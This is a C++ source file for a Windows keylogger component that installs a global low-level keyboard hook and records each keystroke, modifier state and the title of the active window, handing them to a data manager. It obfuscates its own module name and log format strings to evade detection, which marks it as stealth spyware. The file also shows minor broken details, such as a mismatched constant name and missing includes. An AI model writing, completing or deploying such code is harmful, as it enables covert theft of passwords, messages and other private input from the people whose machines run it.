#include "hooks/KeyHook.h"
#include "data/DataManager.h"
#include "core/Logger.h"
#include "utils/TimeUtils.h"
#include "security/Obfuscation.h"
#include <Windows.h>
#include <string>
#include <sstream>

// Obfuscated strings
constexpr auto OBF_KEYHOOK_MODULE = OBFUSCATE("KeyHook");
constexpr auto OBF_KEYLOG_FORMAT = OBFUSCATE("KeyEvent: { action: %s, key: %s, modifiers: %s, window: '%s' }");

// Static member initialization
HHOOK KeyHook::s_keyboardHook = nullptr;
KeyHook* KeyHook::s_instance = nullptr;

KeyHook::KeyHook(DataManager* dataManager) 
    : m_dataManager(dataManager), m_isActive(false) {
    s_instance = this;
}

KeyHook::~KeyHook() {
    RemoveHook();
    s_instance = nullptr;
}

bool KeyHook::InstallHook() {
    if (m_isActive) {
        LOG_WARN("Keyboard hook already installed");
        return true;
    }

    // Set low-level keyboard hook
    s_keyboardHook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        KeyboardProc,
        GetModuleHandleW(NULL),
        0
    );

    if (!s_keyboardHook) {
        DWORD error = GetLastError();
        LOG_ERROR("Failed to install keyboard hook. Error: " + std::to_string(error));
        return false;
    }

    m_isActive = true;
    LOG_INFO("Keyboard hook installed successfully");
    return true;
}

bool KeyHook::RemoveHook() {
    if (!m_isActive) return true;

    if (s_keyboardHook && !UnhookWindowsHookEx(s_keyboardHook)) {
        DWORD error = GetLastError();
        LOG_ERROR("Failed to remove keyboard hook. Error: " + std::to_string(error));
        return false;
    }

    s_keyboardHook = nullptr;
    m_isActive = false;
    LOG_INFO("Keyboard hook removed successfully");
    return true;
}

LRESULT CALLBACK KeyHook::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= HC_ACTION && s_instance) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        s_instance->ProcessKeyEvent(wParam, kbStruct);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void KeyHook::ProcessKeyEvent(WPARAM eventType, KBDLLHOOKSTRUCT* kbStruct) {
    try {
        KeyData keyData;
        keyData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
        keyData.keyCode = kbStruct->vkCode;
        keyData.scanCode = kbStruct->scanCode;
        keyData.flags = kbStruct->flags;
        keyData.eventType = (eventType == WM_KEYDOWN || eventType == WM_SYSKEYDOWN) ? 
            KeyEventType::KEY_DOWN : KeyEventType::KEY_UP;

        // Get active window title
        keyData.windowTitle = GetActiveWindowTitle();

        // Get modifier keys state
        keyData.modifiers = GetModifierKeys();

        // Convert to readable format
        keyData.keyName = VirtualKeyCodeToString(kbStruct->vkCode);

        // Add to data manager
        m_dataManager->AddKeyData(keyData);

        // Debug logging
        if (Logger::GetLogLevel() <= LogLevel::DEBUG) {
            LogKeyEvent(keyData);
        }
    }
    catch (const std::exception& e) {
        LOG_ERROR(std::string("Error processing key event: ") + e.what());
    }
}

std::string KeyHook::GetActiveWindowTitle() const {
    HWND foregroundWindow = GetForegroundWindow();
    if (!foregroundWindow) return "Unknown";

    wchar_t windowTitle[256];
    if (GetWindowTextW(foregroundWindow, windowTitle, sizeof(windowTitle) / sizeof(wchar_t))) {
        return utils::StringUtils::WideToUtf8(windowTitle);
    }

    return "Unknown";
}

KeyModifiers KeyHook::GetModifierKeys() const {
    KeyModifiers modifiers = KeyModifiers::NONE;

    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) modifiers |= KeyModifiers::SHIFT;
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) modifiers |= KeyModifiers::CONTROL;
    if (GetAsyncKeyState(VK_MENU) & 0x8000) modifiers |= KeyModifiers::ALT;
    if (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000) 
        modifiers |= KeyModifiers::WIN;
    if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) modifiers |= KeyModifiers::CAPS_LOCK;
    if (GetAsyncKeyState(VK_NUMLOCK) & 0x0001) modifiers |= KeyModifiers::NUM_LOCK;

    return modifiers;
}

std::string KeyHook::VirtualKeyCodeToString(UINT vkCode) const {
    // Map of common virtual key codes to names
    static const std::map<UINT, std::string> keyMap = {
        {VK_BACK, "Backspace"}, {VK_TAB, "Tab"}, {VK_RETURN, "Enter"},
        {VK_SHIFT, "Shift"}, {VK_CONTROL, "Ctrl"}, {VK_MENU, "Alt"},
        {VK_PAUSE, "Pause"}, {VK_CAPITAL, "CapsLock"}, {VK_ESCAPE, "Escape"},
        {VK_SPACE, "Space"}, {VK_PRIOR, "PageUp"}, {VK_NEXT, "PageDown"},
        {VK_END, "End"}, {VK_HOME, "Home"}, {VK_LEFT, "Left"},
        {VK_UP, "Up"}, {VK_RIGHT, "Right"}, {VK_DOWN, "Down"},
        {VK_INSERT, "Insert"}, {VK_DELETE, "Delete"}, {VK_LWIN, "Win"},
        {VK_RWIN, "Win"}, {VK_NUMLOCK, "NumLock"}, {VK_SCROLL, "ScrollLock"},
        {VK_ADD, "+"}, {VK_SUBTRACT, "-"}, {VK_MULTIPLY, "*"},
        {VK_DIVIDE, "/"}, {VK_DECIMAL, "."}
    };

    auto it = keyMap.find(vkCode);
    if (it != keyMap.end()) {
        return it->second;
    }

    // Check for字母键
    if ((vkCode >= 'A' && vkCode <= 'Z') || 
        (vkCode >= '0' && vkCode <= '9')) {
        return std::string(1, static_cast<char>(vkCode));
    }

    // Check for function keys
    if (vkCode >= VK_F1 && vkCode <= VK_F24) {
        return "F" + std::to_string(vkCode - VK_F1 + 1);
    }

    // Convert using MapVirtualKey for other keys
    char keyName[256];
    UINT scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
    if (GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName))) {
        return keyName;
    }

    return "VK_" + std::to_string(vkCode);
}

void KeyHook::LogKeyEvent(const KeyData& keyData) const {
    std::string action = (keyData.eventType == KeyEventType::KEY_DOWN) ? "DOWN" : "UP";
    
    std::string modifiers;
    if (keyData.modifiers & KeyModifiers::SHIFT) modifiers += "SHIFT+";
    if (keyData.modifiers & KeyModifiers::CONTROL) modifiers += "CTRL+";
    if (keyData.modifiers & KeyModifiers::ALT) modifiers += "ALT+";
    if (keyData.modifiers & KeyModifiers::WIN) modifiers += "WIN+";
    if (modifiers.empty()) modifiers = "NONE";

    char logMessage[512];
    snprintf(logMessage, sizeof(logMessage), OBFUSCATED_KEYLOG_FORMAT,
             action.c_str(), keyData.keyName.c_str(),
             modifiers.c_str(), keyData.windowTitle.c_str());

    LOG_DEBUG(logMessage);
}